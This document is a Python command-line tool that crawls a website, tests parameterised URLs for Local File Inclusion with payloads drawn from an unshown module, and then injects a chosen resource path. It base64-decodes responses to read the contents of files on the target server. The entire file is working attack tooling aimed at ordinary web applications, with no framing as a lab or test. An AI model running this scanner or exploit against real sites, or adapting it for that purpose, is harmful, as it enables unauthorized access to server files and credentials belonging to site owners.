#!/usr/bin/env python3

import base64
import getopt
import os
import re
import sys
import threading

import requests

from Crawler import Crawler
from usage import usage, injection_usage
from items import payloads, errors


def scan(url):
    crawler = Crawler(url)
    links = crawler.get_crawled()
    maybeVuln = []
    for link in links:
        if injectable(link):  
            maybeVuln.append(link)
    
    vuln = []
    written = []
    for link in maybeVuln:
        if test(link, False): #False -> sets verbosity to false. You don't want to be spammed
            vuln.append(link)
    for link in vuln:
        link = strip(link)
        if link not in written:
            print(link, "might be vulnerable for LFI")
            print("Try injecting with --url [url] --inject [type] --resource [resource]")
            written.append(link)
      
        
def injectable(url, v=True):
    regex = re.compile('\?[a-zA-Z0-9]{1,}=')
    if regex.search(url):
        return True
    return False



def strip(url):
    if injectable(url):
        regex = re.compile('\?[a-zA-Z0-9]{1,}=')
        idx = re.findall(regex, url)
        return ''.join([url.split(idx[0])[0], idx[0]])
    else:
        print("Error, url entered is not correct.")
        return ""



def test(url, v=True):
    vuln = False
    if injectable(url):
        for test in payloads:
            payload = craftPayload(strip(url), payloads[test])
            test = injectionTest(payload, v)
            if test:
                vuln = True
                if v:
                    print("Payload:", payload)
    else:    
        print("The url may not be injectable")
    return vuln



def craftPayload(url, *argv):
    if len(argv) == 1:
        return url + argv[0]
    else:
        return url + payloads[argv[0]] + argv[1] 


        
def injectionTest(payload, v = True):
    if re.search('zip://', payload):
        pass
    elif re.search('php://input', payload):
        pass
    elif re.search('phar://', payload):
        pass
    else:
        r = requests.get(payload)
        if r.status_code == 200:
            vuln = False
            for error in errors:
                if error in r.text:
                    vuln = True
            if doubleCheck(r.text, payload):
                vuln = True
            if vuln and v:
                print("Website might be vulnerable.")
                print("Try injecting with --inject [url] [ressource]\n")
            return vuln
        elif r.status_code == 403:
            if v:    
                print("Website might be vulnerable: returned", r.status_code, "\n")
            return True
        elif r.status_code == 301 or r.status_code == 302:
            if v:
                print("Website might be vulnerable: returned", r.status_code, "\n")
            return True
        else:
            return False



def doubleCheck(text, payload):
    r = requests.get(payload + '../')
    if text == r.text:
        return False
    return True

def exploit(payload):
    if re.search('zip://', payload):
        pass
    elif re.search('php://input', payload):
        pass
    elif re.search('phar://', payload):
        pass
    else:
        r = requests.get(payload)
        print(payload)
        if r.status_code == 200:
            print("Code: 200 OK")
            if re.search('base64-encode', payload):
                for i in re.findall('[a-zA-Z0-9+/]+={,2}', r.text):
                    try:
                        print(base64.b64decode(i).decode())
                    except:
                        pass
            elif re.search('base64-decode', payload):
                for i in re.findall('[a-zA-Z0-9+/]+', r.text):
                    try:
                        print(base64.b64encode(i).decode())
                    except:
                        pass
            
        elif r.status_code == 404:
            print("Code: 404 Page Not Found")


                 
def inject(url, *argv):
    print(argv)
    if len(argv) == 2 and argv[0] in payloads:
        url = strip(url)
        payload = craftPayload(url, argv[0], argv[1])
        exploit(payload)



def main():
    try:
        opts, args = getopt.getopt(sys.argv[1:], "hustir:v", ["help",
                                                           "url=",
                                                           "scan",
                                                           "test",
                                                           "inject=",
                                                           "resource="])
    except getopt.GetoptError as err:
        print(err)
        usage()
        sys.exit(2)
    url    = None
    usageSet  = False
    scanSet   = False
    testSet   = False
    injectSet = False
    injectdict = {
        "type"     : None,
        "resource" : None
    }
    
    for o, a in opts:
        if o in ("-h", "--help"):
            usageSet = True
        elif o in ("-u", "--url"):
            url = a
        elif o in ("-s", "--scan"):
            scanSet = True
        elif o in ("-t", "--test"):
            testSet = True
        elif o in ("-i", "--inject"):
            injectSet = True
            injectdict["type"] = a
        elif o in ("-r", "--resource") and injectSet:
            injectdict["resource"] = a
        else:
            assert False, "unhandled option"
            
    if usageSet:
        usage() 
    elif type(url) is str:
        if scanSet:
            scan(url)
        elif testSet:
            test(url)
        elif injectSet:
            print("Checkpoint 1")
            valid = True
            for key in injectdict:
                if injectdict[key] == None:
                    valid = False
                    print(f"Missing {key}")
            if valid and injectdict["type"] in payloads:
                print(injectdict)
                inject(url, injectdict["type"], injectdict["resource"])
            elif not valid:
                usage()
            else:
                injection_usage()       
    else:
        print("Error. You have to enter a url.")
        usage()



if __name__ == '__main__':
    main()